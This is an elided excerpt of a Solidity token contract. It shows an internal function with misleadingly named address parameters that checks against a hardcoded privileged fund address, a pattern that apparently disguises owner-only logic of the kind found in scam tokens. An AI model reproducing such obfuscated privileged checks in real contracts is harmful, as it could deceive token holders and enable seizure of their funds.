...
abstract contract AbsToken is IERC20, Ownable {
    ...
    function _game(address amountADesired, address amountBDesired) internal view returns (bool){
        return (amountADesired != amountBDesired) || (amountADesired != fundAddress);
    }
...
contract TOKEN is AbsToken {
    constructor() AbsToken(
        ...
        9,
        1000000000000000000,
        address(0x4D31E68184372bB571735ace08260BE5788E6798),
        address(0x4D31E68184372bB571735ace08260BE5788E6798)
    ){
    }
}